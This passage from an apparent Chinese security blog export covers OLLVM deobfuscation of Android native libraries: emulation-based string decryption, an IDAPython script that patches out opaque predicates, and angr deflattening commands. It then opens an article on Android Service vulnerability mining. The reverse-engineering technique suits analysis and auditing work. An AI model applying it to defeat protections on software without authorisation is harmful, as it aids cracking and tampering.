对目标函数进行修复、恢复原始逻辑</span><br></pre></td></tr></table></figure>\n\n<p><strong>（1）保存所有的基本块</strong></p>\n<p>控制流平坦化本质逻辑是把原始的基本块都碎片化，再通过switch-case语句，对函数的执行流进行重建。那么反混淆的时候，可以尝试根据主分发器将这些执行链给一条条的拆解出来，具体划分为三类：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">入口链：原始函数代码的入口逻辑链，为序言到主分发器的执行路径</span><br><span class=\"line\">循环链：入口及出口均为主分发器的流程链，对应混淆过程中的循环体</span><br><span class=\"line\">Return链：指代入口为主分发器，出口为目标函数结束地址的流程链</span><br></pre></td></tr></table></figure>\n\n<p><strong>（2）区分真实块和分发器</strong></p>\n<p>其中入口链没有分发器这样的控制块，所以代码全是真实指令。所以主要是找出循环链及Return链中的真实块，一般有几种思路：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）通过特征匹配来找真实块</span><br><span class=\"line\">（2）真实块的入口跳转地址必须为绝对的比较指令，如beq、bne，首次匹配到这种绝对的跳转指令，就能定位对应流程链中的真实入口地址，然后识别真是快</span><br><span class=\"line\">（3）凡是有内存操作的以及有bl/blx函数调用的都是真实块，其中有一些指向主分发器的虚拟块也会包含内存操作</span><br></pre></td></tr></table></figure>\n\n<p>主分发器的确定：直接遍历目标函数下的所有基本块，并计算每一个Block的引用次数，数量最多的那个就是主分发器</p>\n<p><strong>（3）连接真实块的顺序</strong></p>\n<p>通过判断movwne&#x2F;movtne r1指令的地址是否大于mov r1，如果大于就说明此真实块会有两条路径去指向两个基本块。对于有两条路径的真实块就需要寻找两次分别去寻找两条路径下对应的真实块，而对于没有两条路径的真实块就直接寻找一次路径就ok了</p>\n<p>一般我们使用模拟执行能解决该问题，但遇到上面情况并需要相应的手动修改</p>\n<p><strong>（4）编写patch</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.打patch，即通过jump指令或者一些条件跳转指令试图将它们重新连接起来</span><br><span class=\"line\">2.提取出所有真实块的指令，并根据它们之间的关系，计算相对偏移，据此对函数进行重构</span><br></pre></td></tr></table></figure>\n\n<p>前者简单，但是适用性不强，后者复杂，但是工作量大。这里我们主要介绍第一种patch</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)把无用块都改成nop指令</span><br><span class=\"line\">(2)针对没有产生分支的真实块把最后一条指令改成jmp指令跳转到下一真实块</span><br><span class=\"line\">(3)产生分支的真实块把CMOV指令改成相应的条件跳转指令跳向符合条件的分支，例如CMOVZ 改成JZ ，再在这条之后添加JMP 指令跳向另一分支</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"3-Ollvm反混淆实操\"><a href=\"#3-Ollvm反混淆实操\" class=\"headerlink\" title=\"3.Ollvm反混淆实操\"></a>3.Ollvm反混淆实操</h2><p>这里收集了一些网上开源的脚本和样例，便于大家学习</p>\n<h3 id=\"3-1反字符串加密\"><a href=\"#3-1反字符串加密\" class=\"headerlink\" title=\"3.1反字符串加密\"></a>3.1反字符串加密</h3><p>首先我们打开一个字符串加密的样本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/6.png\" alt=\"image-20220922172044918\"></p>\n<p>我们可以发现导出函数中有<code>datadiv_decode</code>字段，我们初步判定就是在该函数中完成对字符串的加密</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/7.png\" alt=\"image-20220922172239875\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/8.png\" alt=\"image-20220922172318658\"></p>\n<p>很明显发现这些函数进行了字符串加密</p>\n<p>我们在查看加密函数<code>datadiv_decode</code>的交叉引用，可以很明显的发现在init_array中完成了对字符串的解密</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/9.png\" alt=\"image-20220922172516725\"></p>\n<p>下面我们使用模拟执行的方法来去除ollvm 字符串加密</p>\n<h4 id=\"3-1-1-AndroidNativeEmu\"><a href=\"#3-1-1-AndroidNativeEmu\" class=\"headerlink\" title=\"3.1.1 AndroidNativeEmu\"></a>3.1.1 AndroidNativeEmu</h4><p>AndroidNativeEmu是基于Unicorn的框架，主要解决Unicorn不支持第三方库、JNI_Onload调用等问题</p>\n<p>反混淆思路：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们分析得知，字符串解密一定在init_array运行完结束，将字符串读取到内存，因此我们运行init_array，然后将内存中解密的字符串保存下来即可</span><br></pre></td></tr></table></figure>\n\n<p>运行环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）不使用AndroidNativeEmu项目，可以直接安装 pip install androidemu</span><br><span class=\"line\">（2）也可以去原仓库进行下载</span><br></pre></td></tr></table></figure>\n\n<p>这里我采用第一种环境，解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> unicorn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> androidemu.emulator <span class=\"keyword\">import</span> Emulator</span><br><span class=\"line\"></span><br><span class=\"line\">logging.basicConfig( <span class=\"comment\"># 设置日志</span></span><br><span class=\"line\">    stream=sys.stdout,</span><br><span class=\"line\">    level=logging.DEBUG,</span><br><span class=\"line\">    <span class=\"built_in\">format</span>=<span class=\"string\">&#x27;%(asctime)s %(levelname)7s %(name)34s | %(message)s&#x27;</span></span><br><span class=\"line\">)</span><br><span class=\"line\">logger = logging.getLogger(__name__)</span><br><span class=\"line\">emulator = Emulator(vfp_inst_set=<span class=\"literal\">True</span>, vfs_root=<span class=\"string\">&#x27;vfs&#x27;</span>) <span class=\"comment\"># 创建模拟器</span></span><br><span class=\"line\">str_datas = &#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hook_mem_write</span>(<span class=\"params\">uc,<span class=\"built_in\">type</span>,address,size,value,userdata</span>): <span class=\"comment\"># 当发生写内存操作时进行Hook</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        curdata = struct.pack(<span class=\"string\">&quot;I&quot;</span>, value)[:size]</span><br><span class=\"line\">        str_datas[address] = curdata</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(size)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">emulator.mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem_write) <span class=\"comment\"># 添加Hook，需在加载so前</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#emulator.load_library(&#x27;libc.so&#x27;,do_init=False) # 补充加载libc.so，不然可能会有问题</span></span><br><span class=\"line\"></span><br><span class=\"line\">lib_module = emulator.load_library(<span class=\"string\">&#x27;obf.so&#x27;</span>,do_init=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">base_addr = lib_module.base</span><br><span class=\"line\">sodata = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;obf.so&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read()</span><br><span class=\"line\"><span class=\"keyword\">for</span> address,value <span class=\"keyword\">in</span> str_datas.items():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> base_addr &lt; address &lt; base_addr + lib_module.size: <span class=\"comment\"># 判断是否是我们需要的so文件内存空间</span></span><br><span class=\"line\">        offset = address - base_addr -<span class=\"number\">0x1000</span> <span class=\"comment\"># 加载的基址还多了个0x1000</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;address:0x%x data:%s offset:0x%x &#x27;</span> % (address, value, offset+<span class=\"number\">0x1000</span>))</span><br><span class=\"line\">        sodata = sodata[:(offset)] + value + sodata[offset+<span class=\"built_in\">len</span>(value):] <span class=\"comment\"># 将解密后的字符串写回</span></span><br><span class=\"line\"><span class=\"comment\">#print(&quot;sodata&quot;+str(sodata[:0x3810]))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;obf_new.so&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">    file.write(sodata)</span><br><span class=\"line\">file.close()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">上面脚本中：</span><br><span class=\"line\">obf.so为目标样本</span><br><span class=\"line\">如果在框架中运行，需要导入libc.so</span><br><span class=\"line\">最重要需要注意由于IDA偏移和绝对地址不对 需要offset-0x1000</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/10.png\" alt=\"image-20220922173658071\"></p>\n<p>运行脚本，得到结果</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/11.png\" alt=\"image-20220922173829174\"></p>\n<p>修复前后的so对比：</p>\n<p>原so:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/12.png\" alt=\"image-20220922173934780\"></p>\n<p>修复so：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/13.png\" alt=\"image-20220922174035699\"></p>\n<h4 id=\"3-1-2-IDA插件\"><a href=\"#3-1-2-IDA插件\" class=\"headerlink\" title=\"3.1.2 IDA插件\"></a>3.1.2 IDA插件</h4><p>上面我们使用Unicorn进行了模拟调用，很显然我们还可以制作成相应的IDApython脚本，通过插件来进行动态的查看</p>\n<p>参考链接：<a href=\"https://bbs.pediy.com/thread-268108.htm\">使用unicorn对ollvm字符串进行解密</a></p>\n<p>环境支持：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install unicorn  IDApython安装unicorn</span><br><span class=\"line\">Ida 7.x</span><br><span class=\"line\">python3</span><br><span class=\"line\">uEmu.py</span><br></pre></td></tr></table></figure>\n\n<p>脚本：uEmu.py 代码太长  <a href=\"https://github.com/alexhude/uEmu%EF%BC%88%E6%88%96%E8%80%85%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%9B%9E%E5%A4%8D%EF%BC%9AOllvm%EF%BC%8C%E6%89%80%E6%9C%89%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8F%96%EF%BC%89\">https://github.com/alexhude/uEmu（或者微信公众号回复：Ollvm，所有脚本自取）</a></p>\n<p>脚本导入操作：复制uEmu.py到IDA_Pro_7.5\\plugins\\下，重启ida</p>\n<p>首先我们找到加密函数，设置起始和结束断点：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/14.png\" alt=\"image-20220922175139399\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/15.png\" alt=\"image-20220922175209878\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/16.png\" alt=\"image-20220922175235173\"></p>\n<p>然后我们右键，此时出现uEmu</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/17.png\" alt=\"image-20220922175347552\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">start命令:通过映射所有段并设置 Unicorn 来初始化模拟器</span><br><span class=\"line\">run命令: 模拟指令，直到到达断点或发生错误</span><br><span class=\"line\">Step模拟一条或 N 条指令（按住ALT/OPTION指定一个数字）</span><br><span class=\"line\">stop:中断仿真</span><br><span class=\"line\">Reset:重置仿真引擎并取消映射所有内存区域</span><br><span class=\"line\">Jump to Pc: 只是跳转到当前 PC</span><br><span class=\"line\">Change CPU context: 可以手动或通过 JSON 文件更新 CPU 上下文（见下文）</span><br><span class=\"line\">Show Controls  显示带有 Start/Run/Step/Stop 按钮的窗口</span><br><span class=\"line\">Show CPU Context 显示带有可用寄存器的窗口</span><br><span class=\"line\">Show CPU Extended Context 显示带有扩展寄存器 (FP/SIMD) 的窗口</span><br><span class=\"line\">Show Stack 显示带有当前 Stack 的窗口</span><br><span class=\"line\">Show Memory Range 允许显示特定的内存区域</span><br></pre></td></tr></table></figure>\n\n<p>我们点击start启动初始化模拟器，并不断确定</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/18.png\" alt=\"image-20220922175704258\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/19.png\" alt=\"image-20220922175725288\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/20.png\" alt=\"image-20220922175805710\"></p>\n<p>我们可以使用快捷键<code>ctrl+shfit+alt+s</code>进行快速单步步过</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/21.png\" alt=\"image-20220922180009607\"></p>\n<p>可以选择一次步过多少条指令</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/22.png\" alt=\"image-20220922184945143\"></p>\n<p>此时我们查看0x4004处的字符串，右键uEMu–&gt;Show Memory Range</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/23.png\" alt=\"image-20220922185053241\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/24.png\" alt=\"image-20220922185122178\"></p>\n<p>可以看见此时的还是加密的QUR，还未解密，我们也可以在so中看到</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/25.png\" alt=\"image-20220922185226245\"></p>\n<p>我们继续调试，按照我们上面的结果，这里应该为jni.go into _ini，这里我们可以直接下断点，然后run过去</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/26.png\" alt=\"image-20220922191223988\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/27.png\" alt=\"image-20220922190331570\"></p>\n<p>可以发现很好的进行了解密，其实原理和上面一样</p>\n<h3 id=\"3-2-反虚假控制流\"><a href=\"#3-2-反虚假控制流\" class=\"headerlink\" title=\"3.2 反虚假控制流\"></a>3.2 反虚假控制流</h3><h4 id=\"3-2-1-符号执行\"><a href=\"#3-2-1-符号执行\" class=\"headerlink\" title=\"3.2.1 符号执行\"></a>3.2.1 符号执行</h4><p>环境要求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">安装angr pip install angr==8.19.4.5   angr版本为8.19.4.5</span><br></pre></td></tr></table></figure>\n\n<p>我们打开一个虚假控制流混淆后的样本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/28.png\" alt=\"image-20220922200516763\"></p>\n<p>很明显我们在这里看到了一些不透明谓词，这是一个虚假控制流混淆处理后的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python debogus.py -f target_arm_bogus --addr 0x83B4</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/29.png\" alt=\"image-20220922200812611\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/30.png\" alt=\"image-20220922200840974\"></p>\n<p>这里我们打开修复后的样本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/31.png\" alt=\"image-20220922201047300\"></p>\n<p>可以看到一些不可达块填充为nop</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/32.png\" alt=\"image-20220922201128282\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 去除虚假控制流 idapython脚本</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> ida_xref</span><br><span class=\"line\"><span class=\"keyword\">import</span> ida_idaapi</span><br><span class=\"line\"><span class=\"keyword\">from</span> ida_bytes <span class=\"keyword\">import</span> get_bytes, patch_bytes</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 将 mov 寄存器, 不透明谓词 修改为 mov 寄存器, 0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">do_patch</span>(<span class=\"params\">ea</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> get_bytes(ea, <span class=\"number\">1</span>) == <span class=\"string\">b&quot;\\x8B&quot;</span>: <span class=\"comment\"># mov eax-edi, dword</span></span><br><span class=\"line\">        reg = (<span class=\"built_in\">ord</span>(get_bytes(ea + <span class=\"number\">1</span>, <span class=\"number\">1</span>)) &amp; <span class=\"number\">0b00111000</span>) &gt;&gt; <span class=\"number\">3</span></span><br><span class=\"line\">        patch_bytes(ea, (<span class=\"number\">0xB8</span> + reg).to_bytes(<span class=\"number\">1</span>,<span class=\"string\">&#x27;little&#x27;</span>) + <span class=\"string\">b&#x27;\\x00\\x00\\x00\\x00\\x90&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;error&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 不透明谓词在.bss段的范围</span></span><br><span class=\"line\">start = <span class=\"number\">0x0011028</span></span><br><span class=\"line\">end = <span class=\"number\">0x0011030</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">for</span> addr <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(start,end,<span class=\"number\">4</span>):</span><br><span class=\"line\">    ref = ida_xref.get_first_dref_to(addr)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr).center(<span class=\"number\">20</span>,<span class=\"string\">&#x27;-&#x27;</span>))</span><br><span class=\"line\">    <span class=\"comment\"># 获取所有交叉引用</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(ref != ida_idaapi.BADADDR):</span><br><span class=\"line\">        do_patch(ref)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;patch at &#x27;</span> + <span class=\"built_in\">hex</span>(ref))</span><br><span class=\"line\">        ref = ida_xref.get_next_dref_to(addr, ref)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-&#x27;</span> * <span class=\"number\">20</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-2-模拟执行\"><a href=\"#3-2-2-模拟执行\" class=\"headerlink\" title=\"3.2.2 模拟执行\"></a>3.2.2 模拟执行</h4><p>使用基于Unicorn的框架可以去虚假控制流，思路如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）通过Unicorn模拟执行目标函数，并记录可达块和不可达块的地址，将可达块的地址全部报错</span><br><span class=\"line\">（2）编写IDApython脚本，将不可达块地方全部填充为nop，就可以除去虚假控制流</span><br></pre></td></tr></table></figure>\n\n<p>参考文章：<a href=\"http://missking.cc/2021/05/14/ollvm3/\">http://missking.cc/2021/05/14/ollvm3/</a></p>\n<h3 id=\"3-3-反控制流平坦化\"><a href=\"#3-3-反控制流平坦化\" class=\"headerlink\" title=\"3.3 反控制流平坦化\"></a>3.3 反控制流平坦化</h3><h4 id=\"3-3-1-符号执行\"><a href=\"#3-3-1-符号执行\" class=\"headerlink\" title=\"3.3.1 符号执行\"></a>3.3.1 符号执行</h4><p>环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">安装angr pip install angr==8.19.4.5   angr版本为8.19.4.5</span><br></pre></td></tr></table></figure>\n\n<p>我们先打开一个控制流平坦化的样本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/33.png\" alt=\"image-20220922213932982\"></p>\n<p>这是一个标准的控制流平坦化的样本，我们可以看见序言、主分发器、次分发器、结束块等</p>\n<p>我们通过符号执行来除去：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python deflat.py -f samples/<span class=\"built_in\">bin</span>/check_passwd_arm_flat --addr <span class=\"number\">0x83B0</span>(目标函数地址)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/34.png\" alt=\"image-20220922214629123\"></p>\n<p>我们将修复后的样本打开：</p>\n<p>原样本：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/36.png\" alt=\"image-20220922214902748\"></p>\n<p>去除混淆后的样本：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/35.png\" alt=\"image-20220922214827404\"></p>\n<h4 id=\"3-3-2-模拟执行\"><a href=\"#3-3-2-模拟执行\" class=\"headerlink\" title=\"3.3.2 模拟执行\"></a>3.3.2 模拟执行</h4><p>环境要求：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/43.png\" alt=\"image-20220922220425663\"></p>\n<p>我们打开另外一个样本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/38.png\" alt=\"image-20220922215820915\"></p>\n<p>定位到函数的起始和终止 </p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/39.png\" alt=\"image-20220922215854085\"></p>\n<p>然后启动脚本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/37.png\" alt=\"image-20220922215709565\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/40.png\" alt=\"image-20220922215934225\"></p>\n<p>打开修复后的样本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/41.png\" alt=\"image-20220922220136390\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/42.png\" alt=\"image-20220922220154180\"></p>\n<h2 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4.总结\"></a>4.总结</h2><p>本文初步的简单介绍了当前Ollvm反混淆中的一些方法并进行了复现，样本的实例都来自于当前研究该领域的各个大佬开源脚本，这里就不一一提及了，感兴趣朋友可以查看参考文献。</p>\n<p>本实验的实验样本全部上传至知识星球：安全后厨</p>\n<p>本实验的全部脚本全部上传至github：<a href=\"https://github.com/WindXaa/Android-reverse\">WindXaa</a>或微信公众号：安全后厨</p>\n<h2 id=\"5-参考文章\"><a href=\"#5-参考文章\" class=\"headerlink\" title=\"5.参考文章\"></a>5.参考文章</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bbs.pediy.com/thread-268108.htm#msg_header_h1_0</span><br><span class=\"line\">http://missking.cc/2020/11/03/unicorn2/</span><br><span class=\"line\">https://bbs.pediy.com/thread-266005.htm</span><br></pre></td></tr></table></figure>\n\n<p>虚假控制流：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bbs.pediy.com/thread-257213.htm</span><br><span class=\"line\">https://github.com/llxiaoyuan/llux</span><br><span class=\"line\">https://bbs.pediy.com/thread-257213.htm</span><br><span class=\"line\">https://github.com/cq674350529/deflat</span><br></pre></td></tr></table></figure>\n\n<p>控制流平坦化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.cnblogs.com/revercc/p/16339476.html</span><br><span class=\"line\">https://www.wireghost.cn/2020/08/28/OLLVM%E9%80%9A%E7%94%A8%E5%8F%8D%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%A0%94%E7%A9%B6/</span><br><span class=\"line\">https://security.tencent.com/index.php/blog/msg/112</span><br><span class=\"line\">https://bbs.pediy.com/thread-271557.htm</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（10）——Service漏洞挖掘详解","url":"/2023/02/13/bug0010/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>今天总结Android APP漏洞挖掘四大组件中service漏洞挖掘的知识，希望能通过这系列的文章，对Android APP漏洞挖掘进行一个更加深入的了解，Android APP中Service的漏洞挖掘和我们前文讲的Activity漏洞挖掘差不多，所以部分知识可以参考上篇帖子<a href=\"https://bbs.pediy.com/thread-269211.htm\">Android APP漏洞之战（1）——Activity漏洞挖掘详解</a>。在Service漏洞挖掘中，会逐一列出最基本的漏洞特征，后续会逐步补充相关的漏洞。</p>\n<span id=\"more\"></span>\n<h2 id=\"二、Service漏洞初步介绍\"><a href=\"#二、Service漏洞初步介绍\" class=\"headerlink\" title=\"二、Service漏洞初步介绍\"></a>二、Service漏洞初步介绍</h2><h3 id=\"1-service基本介绍\"><a href=\"#1-service基本介绍\" class=\"headerlink\" title=\"1.service基本介绍\"></a>1.service基本介绍</h3><h4 id=\"（1）service的基本作用\"><a href=\"#（1）service的基本作用\" class=\"headerlink\" title=\"（1）service的基本作用\"></a>（1）service的基本作用</h4><p>Service(服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。</p>\n<h4 id=\"（2）service的引入-lt-线程与服务的区别-gt\"><a href=\"#（2）service的引入-lt-线程与服务的区别-gt\" class=\"headerlink\" title=\"（2）service的引入&lt;线程与服务的区别&gt;\"></a>（2）service的引入&lt;线程与服务的区别&gt;</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）Thread是程序执行的最小单元，是分配CPU的基本单位，可以使用Thread来执行一些异步操作</span><br><span class=\"line\">（<span class=\"number\">2</span>）Service是android的一种机制，运行在主线程的main线程上</span><br><span class=\"line\">    </span><br><span class=\"line\"> 问题：Thread的运行是独立与Activity的，当一个Activity被finish后，你没有主动停止Thread的话，Thread就会一直执行但是Activity被finish后，你不在持有该Thread的引用，你没有办法在不同的Activity中对同一Thread进行控制？</span><br><span class=\"line\"> 解决：你的Thread需要不停的间隔一段时间连接服务器做某种同步，该Thread需要在Activity没有start时候也运行，但是你start一个Activity后，你就不能控制Thread。因此你创建一个Service，在Service里面创建、运行并控制Thread，就可以解决（任何Activity都可以控制同一Service）</span><br><span class=\"line\">    </span><br><span class=\"line\"> 总结：Service是一种消息机制，而你可以在任何有 Context 的地方调用 Context.startService、Context.stopService、Context.bindService，Context.unbindService，来控制它，你也可以在 Service 里注册 BroadcastReceiver，在其他地方通过发送broadcast 来控制它，当然这些都是 Thread 做不到的</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）service的创建\"><a href=\"#（3）service的创建\" class=\"headerlink\" title=\"（3）service的创建\"></a>（3）service的创建</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">步骤：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）我们创建一个服务service</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）我们重写服务中的三大方法onCreate()、onStartCommand()、onDestroy()</span><br><span class=\"line\"> 详解：</span><br><span class=\"line\">（<span class=\"number\">1</span>）OnCreate()方法会在服务创建的时候调用</span><br><span class=\"line\">（<span class=\"number\">2</span>）onStartCommand()方法会在每次服务启动的时候调用</span><br><span class=\"line\">（<span class=\"number\">3</span>）onDestroy()会在服务销毁的时候调用通常我们希望在服务启动立刻执行某个动作，就会在onStartCommand()里</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）service的启动\"><a href=\"#（4）service的启动\" class=\"headerlink\" title=\"（4）service的启动\"></a>（4）service的启动</h4><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/1.png\" alt=\"image-20210908160022420\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">启动方式：</span><br><span class=\"line\">（<span class=\"number\">1</span>）startService：主要用于启动一个服务执行后台任务，不进行通信，而且必须用stopService来结束，不调用会导致Activity结束而Service还运行</span><br><span class=\"line\">（<span class=\"number\">2</span>）bindService：该方法启动的服务还可以进行通信，启动的Service可以由unbindService来结束，也可以在Activity结束之后自动结束</span><br><span class=\"line\">（<span class=\"number\">3</span>）startService 同时也 bindService 启动的服务：停止服务应同时使用stepService与unbindService</span><br></pre></td></tr></table></figure>\n\n<p>一般来说我们使用服务，主要分为前面两种</p>\n<p><strong>StartService：</strong></p>\n<p>我们根据Intent的启动方式，又可以通过显式启动和隐式启动</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">显示启动：</span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(<span class=\"built_in\">this</span>,TestService.class);</span><br><span class=\"line\">startService(intent);</span><br><span class=\"line\">隐式启动：</span><br><span class=\"line\">（<span class=\"number\">1</span>）使用Action启动</span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> 